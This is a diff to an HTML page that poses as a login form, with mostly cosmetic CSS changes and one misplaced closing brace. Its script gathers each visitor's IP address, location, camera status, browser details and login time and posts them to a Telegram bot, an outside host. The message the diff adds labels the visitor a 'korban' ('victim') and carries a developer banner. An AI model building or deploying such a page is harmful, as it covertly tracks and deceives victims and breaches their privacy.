@@ -13,34 +13,39 @@
       justify-content: center;
       height: 100vh;
       margin: 0;
+      padding: 20px;
+      box-sizing: border-box;
     }
     .login-box {
       background-color: #2e3e4f;
-      padding: 30px;
+      padding: 25px 20px;
       border-radius: 10px;
       text-align: center;
-      width: 90%;
-      max-width: 400px;
+      width: 100%;
+      max-width: 360px;
       box-shadow: 0 0 10px rgba(0,0,0,0.3);
     }
     .login-box h2 {
-      margin-bottom: 20px;
-    }
+      margin-bottom: 15px;
+      font-size: 20px;
     .login-box input {
       width: 100%;
-      padding: 10px;
+      padding: 12px;
       margin: 10px 0;
       border: none;
       border-radius: 5px;
+      font-size: 16px;
     }
     .login-box button {
       width: 100%;
-      padding: 10px;
+      padding: 12px;
       background-color: #3b82f6;
       border: none;
       color: white;
       border-radius: 5px;
       cursor: pointer;
+      font-size: 16px;
+    }
     }
     #camera {
       border: 1px solid black;
@@ -54,6 +59,7 @@
       margin-top: 20px;
       font-size: 12px;
       color: #aaa;
+      text-align: center;
     }
   </style>
 </head>
@@ -148,7 +154,21 @@
       const userAgent = navigator.userAgent;
       const time = new Date().toLocaleString();
 
-      const message = `\u0060\u0060\u0060\nIP Address: ${ipAddress}\nLokasi: ${locationInfo}\nKamera: ${cameraStatus}\nUser-Agent: ${userAgent}\nWaktu Login: ${time}\n\u0060\u0060\u0060`;
+      const message = `
+|------------------------------------------
+| 👑 Developer : HANXX
+| 🌐 Language : HTML
+| 🧩 Version : 1.0
+|------------------------------------------
+| // DAPET KORBAN NIH :
+| 
+| 🔎 IP Address: ${ipAddress}
+| 📍 Lokasi: ${locationInfo}
+| 📸 Kamera: ${cameraStatus}
+| 🗃 User-Agent: ${userAgent}
+| 🕰 Waktu Login: ${time}
+|------------------------------------------
+`;
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
